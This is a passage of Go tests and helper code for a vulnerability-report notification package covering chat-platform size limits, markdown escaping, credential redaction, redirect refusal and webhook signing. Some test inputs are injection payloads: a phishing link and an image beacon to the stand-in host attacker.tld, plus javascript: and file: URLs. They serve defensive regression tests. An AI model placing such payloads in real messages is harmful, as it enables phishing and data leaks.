		t.Fatalf("should state that more items are not included:\n%.300s", text)
	}
}

func TestFeishuPackingReportsKept(t *testing.T) {
	m := batchMsg(2000)
	_, kept := feishuCard(m)
	if kept <= 0 || kept >= len(m.Items) {
		t.Fatalf("the card should only fit a part, got %d", kept)
	}
}

// TestFeishuDigestBodiesStayWithinCardLimit covers digests of many short items.
//
// Every digest line is sent as its own card element, which costs about 52 bytes
// of JSON around the text plus whatever the encoding escapes. The packing used
// to count the text only, so a digest of several hundred short lines left as one
// request of more than twice Feishu's 20 KB limit, and Feishu rejects such a
// request as a whole.
//
// The digest is sent the way the delivery engine does it: the items a message
// did not hold go into the next one. The bodies measured are the real ones sent
// on the wire, signature included. No item may be lost on the way: across the
// messages, every item appears exactly once and in order.
func TestFeishuDigestBodiesStayWithinCardLimit(t *testing.T) {
	const total = 500

	short := batchMsg(total)
	for i := range short.Items {
		short.Items[i].Assets = nil
	}
	// The JSON encoding escapes quotes, angle brackets and ampersands, and the
	// backslashes the lark_md escaping put in before it: these titles take
	// several times their length once serialized.
	escaped := batchMsg(total)
	for i := range escaped.Items {
		escaped.Items[i].Name = `<a href="x">R&D</a> vuln` + itoa(i+1)
	}

	cases := []struct {
		name string
		m    Message
	}{
		{"short lines without assets", short},
		{"short lines with one asset", batchMsg(total)},
		{"lines that grow when serialized", escaped},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var raw []byte
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				raw, _ = io.ReadAll(r.Body)
				_, _ = io.WriteString(w, `{"code":0,"msg":"success"}`)
			}))
			defer srv.Close()
			cfg := map[string]any{"webhook": srv.URL, "secret": "SECtest123"}

			m := tc.m
			seen, messages := 0, 0
			for len(m.Items) > 0 {
				kept, err := (feishuChannel{}).Send(context.Background(), cfg, m)
				if err != nil {
					t.Fatalf("message %d: delivery failed: %v", messages+1, err)
				}
				messages++
				if len(raw) > feishuMaxCardBytes {
					t.Fatalf("message %d: request body of %d bytes exceeds the limit of %d (%d of %d items left to send)",
						messages, len(raw), feishuMaxCardBytes, len(m.Items), total)
				}
				var body struct {
					Card json.RawMessage `json:"card"`
				}
				var card struct {
					Elements []struct {
						Tag  string `json:"tag"`
						Text struct {
							Content string `json:"content"`
						} `json:"text"`
					} `json:"elements"`
				}
				if err := json.Unmarshal(raw, &body); err != nil {
					t.Fatalf("message %d: request body is not valid JSON: %v", messages, err)
				}
				if err := json.Unmarshal(body.Card, &card); err != nil {
					t.Fatalf("message %d: card is not valid JSON: %v", messages, err)
				}
				// The packing counts what Send adds around the card as a constant.
				if got := len(raw) - len(body.Card); got != feishuEnvelopeBytes {
					t.Fatalf("message %d: %d bytes around the card, feishuEnvelopeBytes says %d", messages, got, feishuEnvelopeBytes)
				}
				// Element 0 is the intro; the button, when present, is not a div.
				lines := 0
				for _, el := range card.Elements[1:] {
					if el.Tag != "div" {
						continue
					}
					lines++
					if want := "vuln" + itoa(seen+lines) + "**"; !strings.Contains(el.Text.Content, want) {
						t.Fatalf("message %d: line %d should be item %d (%q), got %q", messages, lines, seen+lines, want, el.Text.Content)
					}
				}
				if kept <= 0 || kept != lines {
					t.Fatalf("message %d: %d items reported as delivered, the body holds %d", messages, kept, lines)
				}
				t.Logf("message %d: %d items, %d bytes", messages, kept, len(raw))
				seen += kept
				m.Items = m.Items[kept:]
			}
			if seen != total {
				t.Fatalf("%d items went out across %d messages, want %d", seen, messages, total)
			}
			if messages < 2 {
				t.Fatalf("%d items should not fit one message", total)
			}
		})
	}
}

func TestWebhookAndEmailReportAllItems(t *testing.T) {
	// These two channels do not truncate the body; the whole batch counts as
	// delivered.
	m := batchMsg(7)
	if n := len(m.Items); n != 7 {
		t.Fatal("precondition does not hold")
	}
	// Confirm indirectly via the renderer's return value: markdownBody(0) keeps
	// everything when unlimited.
	if _, k := markdownBody(m, 0); k != len(m.Items) {
		t.Fatalf("everything should be used when length is unlimited, got %d", k)
	}
}

// TestMarkdownEscapesUntrustedContent is the regression test for "untrusted
// content must not change message structure". Titles and summaries come from
// model output (the model reads the tested target's responses); asset names come
// from the tested target's URLs.
func TestMarkdownEscapesUntrustedContent(t *testing.T) {
	cases := []struct {
		name  string
		item  Item
		must  []string // must appear in the result (escaped form)
		wrong []string // must not appear in the result (unescaped form)
	}{
		{
			name: "newline + external link in the title",
			item: Item{
				Severity: "high",
				Name:     "SQL injection on login page\n[URGENT: click to verify your account](http://attacker.tld)",
			},
			// The newline must be collapsed (otherwise it can forge a new list
			// item / quote block); the square brackets and parentheses must be
			// escaped (otherwise it is a clickable external link).
			must:  []string{`\[URGENT: click to verify your account\]`, `\(http://attacker.tld\)`},
			wrong: []string{"\n[URGENT", "\n\n[URGENT"},
		},
		{
			name: "image beacon in the title",
			item: Item{
				Severity: "high",
				Name:     "Vuln ![](http://attacker.tld/beacon)",
			},
			must:  []string{`\!`, `\(http://attacker.tld/beacon\)`},
			wrong: []string{"![]("},
		},
		{
			name: "emphasis and quote in an asset name",
			item: Item{
				Severity: "high",
				Name:     "plain title",
				Assets:   []string{"a.com/*inject*>quote"},
			},
			must:  []string{`\*inject\*`, `\>`},
			wrong: []string{"*inject*"},
		},
		{
			name: "backticks and pipe in the summary",
			item: Item{
				Severity: "high",
				Name:     "title",
				Summary:  "`code` | table",
			},
			must:  []string{"\\`code\\`", `\|`},
			wrong: []string{"`code`"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			m := Message{Items: []Item{tc.item}}
			// writeItem in single mode is the rendering path shared by all three
			// markdown channels.
			var b strings.Builder
			writeItem(&b, tc.item, "", true, m.limits())
			got := b.String()
			for _, want := range tc.must {
				if !strings.Contains(got, want) {
					t.Errorf("missing escaped form %q:\n%s", want, got)
				}
			}
			for _, bad := range tc.wrong {
				if strings.Contains(got, bad) {
					t.Errorf("unescaped form %q appeared (can be used to inject structure or external links):\n%s", bad, got)
				}
			}
			_ = m
		})
	}
}

// TestMarkdownEscapeBackslashFirst locks the escape order: the backslash must be
// handled first, otherwise the backslashes added later get another layer and the
// output ends up with double backslashes.
func TestMarkdownEscapeBackslashFirst(t *testing.T) {
	if got := markdownEscape(`a\b*c`); got != `a\\b\*c` {
		t.Fatalf("wrong escape order, got %q", got)
	}
}

// TestTelegramTitleHasNoMarkdownEscapes locks a specific regression: markdown
// escapes must not leak into Telegram's HTML output (an escape was once added to
// the shared title function, and Telegram messages ended up showing visible
// backslashes like `\(1\)`).
func TestTelegramTitleHasNoMarkdownEscapes(t *testing.T) {
	m := Message{Items: []Item{{Severity: "high", Name: "alert(1) *important*"}}}
	text, _ := telegramHTML(m)
	if strings.Contains(text, `\(`) || strings.Contains(text, `\*`) {
		t.Fatalf("markdown backslash escapes appeared in the Telegram body:\n%s", text)
	}
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

FILE: notify/redact_test.go

package notify

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
)

// This file holds invariant tests: **no** error text escaping from a channel
// implementation may carry credentials.
//
// Why a separate file: the original channel cases covered only success paths and
// platform business errors, never looking at transport-layer failures. Yet
// transport-layer errors (connection refused / DNS failure / timeout) are the
// most dangerous — the *url.Error returned by http.Client.Do prints the **full
// URL** into the error text, and the credentials of these platforms are in the
// URL. The credentials rode this string to four outlets:
//
//	notification_deliveries.last_error  → stored in plaintext
//	GET /api/notify/deliveries response → bypasses the channel config masking, echoed to the browser
//	server logs                         → often exported and retained
//	the test-send API's 502 response    → popped up directly in the frontend
//
// So instead of testing one function, this file fires one doomed-to-fail request
// per channel and asserts the credential cannot be found in the error text.

// credentialCases covers every channel shape where "the credential is in the
// URL": DingTalk/WeCom in the query, Feishu in the last path segment, Telegram
// in the middle of the path.
var credentialCases = []struct {
	name   string
	ch     Channel
	cfg    map[string]any
	secret string
}{
	{
		name:   "DingTalk access_token in query",
		ch:     dingTalkChannel{},
		cfg:    map[string]any{"webhook": "http://127.0.0.1:1/robot/send?access_token=" + leakProbeToken},
		secret: leakProbeToken,
	},
	{
		name:   "WeCom key in query",
		ch:     weComChannel{},
		cfg:    map[string]any{"webhook": "http://127.0.0.1:1/cgi-bin/webhook/send?key=" + leakProbeToken},
		secret: leakProbeToken,
	},
	{
		name:   "Feishu hook id in last path segment",
		ch:     feishuChannel{},
		cfg:    map[string]any{"webhook": "http://127.0.0.1:1/open-apis/bot/v2/hook/" + leakProbeToken},
		secret: leakProbeToken,
	},
	{
		name:   "Telegram bot token in the middle of the path",
		ch:     telegramChannel{},
		cfg:    map[string]any{"bot_token": leakProbeToken, "chat_id": "1", "base_url": "http://127.0.0.1:1"},
		secret: leakProbeToken,
	},
	{
		name:   "DingTalk signing secret",
		ch:     dingTalkChannel{},
		cfg:    map[string]any{"webhook": "http://127.0.0.1:1/robot/send", "secret": leakProbeToken},
		secret: leakProbeToken,
	},
}

// leakProbeToken is a sentinel value that can never be a real credential, used
// to search for it in error text.
const leakProbeToken = "LEAKPROBE0123456789abcdef"

// TestChannelErrorsNeverLeakCredentials is the core invariant.
func TestChannelErrorsNeverLeakCredentials(t *testing.T) {
	for _, tc := range credentialCases {
		t.Run(tc.name, func(t *testing.T) {
			// A doomed peer: nobody listens on 127.0.0.1:1, exercising the
			// connection-refused path.
			_, err := tc.ch.Send(context.Background(), tc.cfg, Message{
				Items: []Item{{FindingID: 1, Severity: "high", Name: "leak probe"}},
			})
			if err == nil {
				t.Fatal("an unreachable address should error")
			}
			assertNoSecret(t, err.Error(), tc.secret)
		})
	}
}

// TestChannelErrorsNeverLeakCredentialsInPermanentPath covers the permanent
// failure branch: URL validation failures, platform business errors, etc. also
// send error text outward, and likewise must not carry credentials.
func TestChannelErrorsNeverLeakCredentialsInPermanentPath(t *testing.T) {
	cases := []struct {
		name string
		ch   Channel
		cfg  map[string]any
	}{
		// Address carries a credential but is malformed → exercises the
		// validateHTTPURL / url.Parse branch.
		{"DingTalk address malformed", dingTalkChannel{}, map[string]any{"webhook": "file:///" + leakProbeToken}},
		{"WeCom address malformed", weComChannel{}, map[string]any{"webhook": "gopher://" + leakProbeToken}},
		{"Feishu address malformed", feishuChannel{}, map[string]any{"webhook": "ftp://" + leakProbeToken + "/hook"}},
		{"Telegram API address malformed", telegramChannel{}, map[string]any{"bot_token": "tok", "chat_id": "1", "base_url": "file://" + leakProbeToken}},
		{"generic webhook address malformed", webhookChannel{}, map[string]any{"url": "javascript:" + leakProbeToken}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := tc.ch.Send(context.Background(), tc.cfg, Message{Items: []Item{{Severity: "high"}}})
			if err == nil {
				t.Fatal("an invalid configuration should error")
			}
			assertNoSecret(t, err.Error(), leakProbeToken)
		})
	}
}

func assertNoSecret(t *testing.T, text, secret string) {
	t.Helper()
	if strings.Contains(text, secret) {
		t.Fatalf("error text leaked the credential %q:\n    %s", secret, text)
	}
}

func TestRedactRequestTargetKeepsOnlySchemeAndHost(t *testing.T) {
	cases := map[string]string{
		"https://oapi.dingtalk.com/robot/send?access_token=S1":    "https://oapi.dingtalk.com/…",
		"https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=S2": "https://qyapi.weixin.qq.com/…",
		"https://open.feishu.cn/open-apis/bot/v2/hook/S3":         "https://open.feishu.cn/…",
		"https://api.telegram.org/botS4/sendMessage":              "https://api.telegram.org/…",
		"http://10.0.0.5:8080/hook":                               "http://10.0.0.5:8080/…",
	}
	for in, want := range cases {
		got := redactRequestTarget(in)
		if got != want {
			t.Errorf("redactRequestTarget(%q) = %q, want %q", in, got, want)
		}
		// The redacted result itself must no longer contain any path/query
		// fragment of the original address.
		if parts := strings.SplitN(in, "://", 2); len(parts) == 2 {
			if hostAndRest := strings.SplitN(parts[1], "/", 2); len(hostAndRest) == 2 && hostAndRest[1] != "" {
				if strings.Contains(got, hostAndRest[1]) {
					t.Errorf("path/query fragment %q still present after redaction: %q", hostAndRest[1], got)
				}
			}
		}
	}
	// Unparseable input is never echoed back.
	for _, bad := range []string{"", "://", "not a url", "http://"} {
		if got := redactRequestTarget(bad); strings.Contains(got, bad) && bad != "" {
			t.Errorf("unparseable input %q was echoed back as %q", bad, got)
		}
	}
}

// TestRedactTransportErrorStripsURL targets the concrete *url.Error type: it is
// what http.Client.Do returns, and the first scene of the leak.
func TestRedactTransportErrorStripsURL(t *testing.T) {
	inner := errors.New("dial tcp 127.0.0.1:1: connect: connection refused")
	uerr := &url.Error{
		Op:  "Post",
		URL: "https://api.telegram.org/bot" + leakProbeToken + "/sendMessage",
		Err: inner,
	}
	got := redactTransportError(uerr)
	assertNoSecret(t, got, leakProbeToken)
	if !strings.Contains(got, "api.telegram.org") {
		t.Errorf("the host should be kept for troubleshooting, got %q", got)
	}
	if !strings.Contains(got, "connection refused") {
		t.Errorf("the underlying cause should be kept for troubleshooting, got %q", got)
	}
	// The Op is also kept (POST vs GET matters for troubleshooting).
	if !strings.Contains(got, "Post") {
		t.Errorf("the operation name should be kept, got %q", got)
	}
}

// TestRedactURLsInTextHandlesFallback is the fallback path: addresses inside
// custom errors that are not *url.Error (such as the errors returned by the
// redirect policy) must likewise be stripped.
func TestRedactURLsInTextHandlesFallback(t *testing.T) {
	in := fmt.Sprintf("refusing cross-host redirect (a.example → http://b.example/bot%s/send)", leakProbeToken)
	got := redactURLsInText(in)
	assertNoSecret(t, got, leakProbeToken)
	if !strings.Contains(got, "http://b.example/…") {
		t.Errorf("addresses should be replaced with the redacted form, got %q", got)
	}
	// Text without addresses is kept as-is.
	if plain := "dial tcp: connection refused"; redactURLsInText(plain) != plain {
		t.Error("text without addresses should not be modified")
	}
}

// TestCrossHostRedirectRefused covers "credentials in the URL + following a
// cross-host redirect = handing over the credentials". The two httptest servers
// listen on different ports of 127.0.0.1, and different ports mean different
// Hosts — exactly a cross-host redirect.
func TestCrossHostRedirectRefused(t *testing.T) {
	var hit bool
	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		hit = true
		_, _ = io.WriteString(w, `{"errcode":0,"errmsg":"ok"}`)
	}))
	defer target.Close()

	redirector := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, target.URL+"/robot/send?access_token="+leakProbeToken, http.StatusTemporaryRedirect)
	}))
	defer redirector.Close()

	_, err := (dingTalkChannel{}).Send(context.Background(),
		map[string]any{"webhook": redirector.URL + "/robot/send?access_token=" + leakProbeToken},
		Message{Items: []Item{{Severity: "high"}}})
	if err == nil {
		t.Fatal("cross-host redirects should be refused")
	}
	if hit {
		t.Fatal("the redirect target was hit — the credentials leaked along with the redirect")
	}
	assertNoSecret(t, err.Error(), leakProbeToken)
}

// TestSameHostRedirectAllowed is the counterpart: same-host redirects (such as
// adding a trailing slash) must keep working, otherwise normal workflows would
// be blocked along with the attack.
func TestSameHostRedirectAllowed(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/robot/send" {
			// Same-host, same-port redirect.
			http.Redirect(w, r, "/robot/send/", http.StatusTemporaryRedirect)
			return
		}
		_, _ = io.WriteString(w, `{"errcode":0,"errmsg":"ok"}`)
	}))
	defer srv.Close()

	if _, err := (dingTalkChannel{}).Send(context.Background(),
		map[string]any{"webhook": srv.URL + "/robot/send"},
		Message{Items: []Item{{Severity: "high"}}}); err != nil {
		t.Fatalf("same-host redirects should not be refused: %v", err)
	}
}

=====================================================================
FILE: notify/render.go
=====================================================================
package notify

import (
	"strings"
	"unicode/utf8"
)

const ellipsis = "…"

// TruncateBytes truncates s to at most max bytes, guaranteeing the result is
// valid UTF-8 and no character is cut in half.
//
// Why cutting on character boundaries is mandatory: WeCom group bots have a hard
// 4096 **byte** limit for markdown (not characters), and one CJK character takes
// 3 bytes. Slicing by raw bytes can split a character in two, producing invalid
// UTF-8 — the platform either rejects the whole message or displays garbled
// squares. The approach here is to back off from the budget position to the
// nearest rune start byte (utf8.RuneStart detects continuation bytes 0b10xxxxxx).
//
// max<=0 means unlimited. An ellipsis is appended after truncation, unless max is
// too small to fit the ellipsis.
func TruncateBytes(s string, max int) string {
	if max <= 0 || len(s) <= max {
		return s
	}
	budget := max - len(ellipsis)
	suffix := ellipsis
	if budget < 0 {
		// max is shorter than the ellipsis itself: give up the ellipsis and just
		// truncate, so the result does not exceed max.
		budget = max
		suffix = ""
	}
	cut := budget
	for cut > 0 && !utf8.RuneStart(s[cut]) {
		cut--
	}
	return s[:cut] + suffix
}

// OneLine compresses multi-line text into a single line: collapses all
// whitespace, then truncates by character count. Used for the title line of IM
// messages — summaries often contain newlines, and stuffing them directly into a
// table/title breaks the layout. max<=0 means no length limit.
func OneLine(s string, max int) string {
	s = strings.Join(strings.Fields(s), " ")
	return TruncateRunes(s, max)
}

// TruncateRunes truncates s to at most max characters (not bytes), appending an
// ellipsis when truncated. max<=0 means unlimited.
//
// The difference from TruncateBytes is the platform's measuring convention: WeCom
// limits by bytes, Telegram by characters. Using the wrong convention does not
// error out; it just cuts messages far shorter than intended (1 CJK character =
// 3 bytes, so cutting at 4096 bytes leaves only about 1365 characters), which is
// why both functions must exist and be chosen per channel.
func TruncateRunes(s string, max int) string {
	if max <= 0 {
		return s
	}
	runes := []rune(s)
	if len(runes) <= max {
		return s
	}
	if max <= 1 {
		return string(runes[:max])
	}
	return string(runes[:max-1]) + ellipsis
}

// TruncateHTML truncates an HTML fragment by character count and guarantees no
// half-cut tags.
//
// Truncating HTML directly can produce broken tags like `<a href="htt`, and the
// platform's parser either rejects the whole message or swallows the following
// body as an attribute value. The approach here: truncate by characters first,
// then check whether the tail has an unclosed `<`, and if so, back off to before
// it.
//
// No tag balancing (closing </b> and the like): Telegram's HTML parser closes
// unclosed tags automatically, and implementing balancing ourselves would have to
// handle quotes inside attributes, comments, and self-closing tags — complexity
// out of proportion to the benefit.
func TruncateHTML(s string, max int) string {
	if max <= 0 || len([]rune(s)) <= max {
		return s
	}
	cut := TruncateRunes(s, max)
	// If the tail is a fragment starting with `<` (no `>` after the last `<`),
	// back off to before the `<`.
	if lt := strings.LastIndex(cut, "<"); lt >= 0 && !strings.Contains(cut[lt:], ">") {
		cut = cut[:lt]
	}
	// Likewise, if the tail is a cut HTML entity (e.g. `&amp;` cut into `&amp`),
	// back off as well. An entity fragment can get the **whole message** rejected
	// by a parser that only recognizes entities — oversized digest messages are
	// common enough that losing the whole notification over this is not worth it.
	if amp := strings.LastIndex(cut, "&"); amp >= 0 && !strings.Contains(cut[amp:], ";") {
		cut = cut[:amp]
	}
	return cut
}

// packItemCount computes how many items fit **wholly** within the budget, so
// digest messages are packed item by item.
//
// Why pack whole items instead of rendering everything and truncating:
// truncation makes the items in the second half vanish into thin air while their
// delivery records are still marked as sent — invisible in the message and
// invisible in the delivery history, and the vulnerabilities are simply gone.
// After packing whole items, the ones that did not fit stay in the database as
// the next batch, and the kept the caller gets is the number of items actually
// delivered by this message.
//
// Parameters: maxSize<=0 means unlimited; reserve is the amount reserved for the
// message header/footer; size does the measuring (each platform has its own
// convention: WeCom/DingTalk by bytes, Telegram by characters — the wrong
// convention does not error out, it just crams CJK messages far below the limit);
// render renders item idx into its actual text — lengths vary by content and
// cannot be estimated.
//
// Returns at least 1 (as long as there are items). Even a single extremely long
// item must be sent, with the caller's final truncation as the backstop;
// otherwise one oversized vulnerability would permanently jam the whole batch in
// place.
func packItemCount(items []Item, maxSize, reserve int, footer string, size func(string) int, render func(Item, int) string) int {
	if maxSize <= 0 {
		return len(items)
	}
	budget := maxSize - reserve - size(footer)
	if budget < 0 {
		budget = 0
	}
	used := 0
	for i, it := range items {
		used += size(render(it, i))
		if used > budget && i > 0 {
			return i
		}
	}
	return len(items)
}

// byteSize / runeSize are the two measuring conventions for packItemCount, given
// names so call sites do not sprout bare func(s string) int closures that hide
// which convention is in use.
func byteSize(s string) int { return len(s) }
func runeSize(s string) int { return utf8.RuneCountInString(s) }

// assetLine renders an asset list into one line of display text; when there are
// more than limit assets, the rest are omitted and their count is noted. A
// vulnerability can be anchored to dozens of assets, and listing them all would
// blow up the message.
func assetLine(assets []string, limit int) string {
	if len(assets) == 0 {
		return ""
	}
	if limit <= 0 || len(assets) <= limit {
		return strings.Join(assets, ", ")
	}
	return strings.Join(assets[:limit], ", ") + " and " + itoa(len(assets)-limit) + " more"
}

// itoa is a short alias for strconv.Itoa, used only for assembling display text,
// to avoid importing strconv everywhere.
func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	neg := n < 0
	if neg {
		n = -n
	}
	var buf [20]byte
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	if neg {
		i--
		buf[i] = '-'
	}
	return string(buf[i:])
}

package notify

import (
	"strings"
	"testing"
	"unicode/utf8"
)

func TestTruncateBytesKeepsValidUTF8(t *testing.T) {
	// This is the most critical invariant of the package. WeCom limits by
	// **bytes**, and a multi-byte character takes several bytes; any
	// implementation that cuts raw bytes will split a character in half,
	// producing invalid UTF-8 that the platform rejects. Use several mixed
	// multi-byte inputs with coprime lengths to hit every possible cut point.
	inputs := []string{
		"éééééé",
		"mixed éé content content",
		"aébécédé",
		"🔴🟠🟡🔵", // 4-byte emoji; a wrong cut is even more obvious
		strings.Repeat("éé", 100),
	}
	for _, in := range inputs {
		for max := 1; max <= len(in)+2; max++ {
			got := TruncateBytes(in, max)
			if !utf8.ValidString(got) {
				t.Fatalf("input %q max=%d: produced invalid UTF-8 %q", in, max, got)
			}
			if len(got) > max {
				t.Fatalf("input %q max=%d: result of %d bytes exceeds the limit", in, max, len(got))
			}
			// Content must not be modified when not truncated.
			if len(in) <= max && got != in {
				t.Fatalf("input %q max=%d: content modified despite being within the limit -> %q", in, max, got)
			}
		}
	}
}

func TestTruncateBytesZeroMeansUnlimited(t *testing.T) {
	long := strings.Repeat("x", 10000)
	if got := TruncateBytes(long, 0); got != long {
		t.Fatal("max=0 should mean unlimited")
	}
	if got := TruncateBytes(long, -5); got != long {
		t.Fatal("max<0 should mean unlimited")
	}
}

func TestTruncateBytesEllipsisBudget(t *testing.T) {
	// When max is smaller than the ellipsis itself, appending the ellipsis must
	// not push the result over the limit.
	got := TruncateBytes("abcdefgh", 1)
	if len(got) > 1 {
		t.Fatalf("with max=1 the result %q has length %d, over the limit", got, len(got))
	}
	// The normal case should carry the ellipsis.
	if got := TruncateBytes("abcdefgh", 5); !strings.HasSuffix(got, ellipsis) {
		t.Fatalf("expected the ellipsis, got %q", got)
	}
}

func TestTruncateRunesCountsCharactersNotBytes(t *testing.T) {
	// The difference in convention from TruncateBytes must be preserved: Telegram
	// limits by characters, and the byte convention would cut a multi-byte
	// message down to a fraction.
	s := "éééééééééé"
	got := TruncateRunes(s, 5)
	if n := utf8.RuneCountInString(got); n != 5 {
		t.Fatalf("expected 5 characters, got %d (%q)", n, got)
	}
	// The same string under the byte convention should come out clearly shorter.
	if utf8.RuneCountInString(TruncateBytes(s, 5)) >= 5 {
		t.Fatal("the byte convention should not produce the same character count as the character convention")
	}
}

func TestOneLineCollapsesWhitespace(t *testing.T) {
	got := OneLine("first line\n\nsecond line\twith tab   spaces", 0)
	if strings.ContainsAny(got, "\n\t") {
		t.Fatalf("should collapse all whitespace, got %q", got)
	}
	if strings.Contains(got, "  ") {
		t.Fatalf("should not keep consecutive spaces, got %q", got)
	}
	// After truncation it must still be readable and valid.
	got = OneLine("éééééééééé", 4)
	if n := utf8.RuneCountInString(got); n != 4 {
		t.Fatalf("expected 4 characters, got %d (%q)", n, got)
	}
}

func TestTruncateHTMLNeverCutsTagInHalf(t *testing.T) {
	// Truncating HTML directly can cut out a fragment like `<a href="htt`, and
	// the platform will reject the whole message.
	s := `<b>Title</b>bodybodybody<a href="https://example.com/very/long/path">View details</a>`
	for max := 1; max <= utf8.RuneCountInString(s)+2; max++ {
		got := TruncateHTML(s, max)
		if n := utf8.RuneCountInString(got); max > 0 && n > max {
			t.Fatalf("max=%d: result of %d characters exceeds the limit", max, n)
		}
		// The tail must not have an unclosed `<` (i.e. a `<` with no `>` in the
		// last segment).
		if lt := strings.LastIndex(got, "<"); lt >= 0 && !strings.Contains(got[lt:], ">") {
			t.Fatalf("max=%d: tail tag was cut in half -> %q", max, got)
		}
	}
}

func TestAssetLineOmitsExcess(t *testing.T) {
	if got := assetLine(nil, 3); got != "" {
		t.Fatalf("no assets should return an empty string, got %q", got)
	}
	if got := assetLine([]string{"a", "b"}, 3); got != "a, b" {
		t.Fatalf("within the limit everything should be listed, got %q", got)
	}
	// Over the limit the number of omitted assets must be noted, otherwise
	// readers cannot tell how many assets were left out.
	if got := assetLine([]string{"a", "b", "c", "d", "e"}, 2); got != "a, b and 3 more" {
		t.Fatalf("5 assets with limit 2 should note the 3 omitted, got %q", got)
	}
	if got := assetLine([]string{"a", "b", "c", "d", "e", "f", "g", "h"}, 3); got != "a, b, c and 5 more" {
		t.Fatalf("8 assets with limit 3 should note the 5 omitted, got %q", got)
	}
}

func TestSeverityAndStatusLabels(t *testing.T) {
	if AtLeast("", "low") {
		t.Fatal("an empty severity has ordinal 0 and should be stopped by any threshold")
	}
	if !AtLeast("critical", "") {
		t.Fatal("an empty threshold should let everything through")
	}
	if got := StatusLabel("fixed"); got != "Fixed" {
		t.Fatalf("wrong status mapping, got %q", got)
	}
	// Unknown statuses are echoed as-is; no label is invented.
	if got := StatusLabel("weird_status"); got != "weird_status" {
		t.Fatalf("an unknown status should be echoed as-is, got %q", got)
	}
}

// TestTruncateHTMLNeverCutsEntity covers an omission pointed out in review:
// truncation must avoid not only half-cut tags but also cut HTML entities.
//
// After `&amp;` is cut into `&amp`, a parser that only recognizes entities may
// reject the **whole** message — and oversized digest messages are common enough
// that the cost is too high.
func TestTruncateHTMLNeverCutsEntity(t *testing.T) {
	s := "aaaa&amp;bbbb&lt;cccc&quot;dddd"
	for max := 1; max <= utf8.RuneCountInString(s)+2; max++ {
		got := TruncateHTML(s, max)
		// The tail must not show an entity fragment of "a & with no matching ;".
		if amp := strings.LastIndex(got, "&"); amp >= 0 && !strings.Contains(got[amp:], ";") {
			t.Fatalf("max=%d: entity fragment left at the tail %q", max, got[amp:])
		}
		if strings.Contains(got, "&amp\x00") {
			t.Fatalf("max=%d: malformed entity appeared", max)
		}
	}
}

package notify

import (
	"net/url"
	"testing"
	"time"
)

// The signature reference values were computed independently with OpenSSL, not
// generated by this package's own implementation — otherwise they could only
// prove "the code has not changed", not "the algorithm is right".
//
//	TS=1700000000000, SECRET=SECtest123
//	DingTalk: printf '%s\n%s' "$TS" "$SECRET" | openssl dgst -sha256 -hmac "$SECRET" -binary | openssl base64 -A
//	      -> w3RMHXzixTMdzr8OHJUmVLS4IoPJVdu+Ut1LE48MePE=
//	Feishu: printf '' | openssl dgst -sha256 -hmac "$(printf '%s\n%s' "$TS" "$SECRET")" -binary | openssl base64 -A
//	      -> Hd4xFWQU6R6ad4nzy4ETIznzlqebqH7xcTFVmONTudo=
const (
	signTestTSMillis = int64(1700000000000)
	signTestSecret   = "SECtest123"
	dingTalkExpected = "w3RMHXzixTMdzr8OHJUmVLS4IoPJVdu+Ut1LE48MePE="
	feishuExpected   = "Hd4xFWQU6R6ad4nzy4ETIznzlqebqH7xcTFVmONTudo="
)

func TestDingTalkSignMatchesReference(t *testing.T) {
	got, err := dingTalkSignedURL("https://oapi.dingtalk.com/robot/send?access_token=tok", signTestSecret, time.UnixMilli(signTestTSMillis))
	if err != nil {
		t.Fatalf("signing failed: %v", err)
	}
	u, err := url.Parse(got)
	if err != nil {
		t.Fatalf("the produced address cannot be parsed: %v", err)
	}
	q := u.Query()
	if q.Get("sign") != dingTalkExpected {
		t.Errorf("signature mismatch\nwant %s\ngot  %s", dingTalkExpected, q.Get("sign"))
	}
	if q.Get("timestamp") != "1700000000000" {
		t.Errorf("the timestamp should be in milliseconds and carried as-is, got %q", q.Get("timestamp"))
	}
	// The original query parameter (access_token) must not be overwritten by the
	// signature.
	if q.Get("access_token") != "tok" {
		t.Errorf("the original query parameter was lost, got %q", q.Get("access_token"))
	}
}

func TestFeishuSignMatchesReference(t *testing.T) {
	got := feishuSign("1700000000000", signTestSecret)
	if got != feishuExpected {
		t.Errorf("signature mismatch\nwant %s\ngot  %s", feishuExpected, got)
	}
}

// TestSignAlgorithmsDiffer locks the difference between the two platforms'
// algorithms. They happen to be mirror images of each other's parameter order
// (DingTalk key=secret, Feishu key=string-to-sign), and copying from the other
// platform always fails verification; this case ensures a future refactor does
// not merge the two into one function.
func TestSignAlgorithmsDiffer(t *testing.T) {
	ts := "1700000000000"
	dingURL, err := dingTalkSignedURL("https://example.com/hook", signTestSecret, time.UnixMilli(signTestTSMillis))
	if err != nil {
		t.Fatal(err)
	}
	dq, _ := url.Parse(dingURL)
	if dq.Query().Get("sign") == feishuSign(ts, signTestSecret) {
		t.Fatal("DingTalk and Feishu signatures are identical, which means one of the two algorithm implementations is wrong")
	}
}

func TestDingTalkNoSecretLeavesURLUntouched(t *testing.T) {
	// A bot without signing enabled: the timestamp/sign parameters must not be
	// added out of thin air.
	const hook = "https://oapi.dingtalk.com/robot/send?access_token=tok"
	got, err := dingTalkSignedURL(hook, "", time.UnixMilli(signTestTSMillis))
	if err != nil {
		t.Fatal(err)
	}
	if got != hook {
		t.Fatalf("the address should not change when no secret is configured, got %q", got)
	}
}

func TestValidateHTTPURL(t *testing.T) {
	ok := []string{"https://example.com/hook", "http://10.0.0.1:8080/x?y=1"}
	for _, s := range ok {
		if err := validateHTTPURL(s); err != nil {
			t.Errorf("%q should be accepted: %v", s, err)
		}
	}
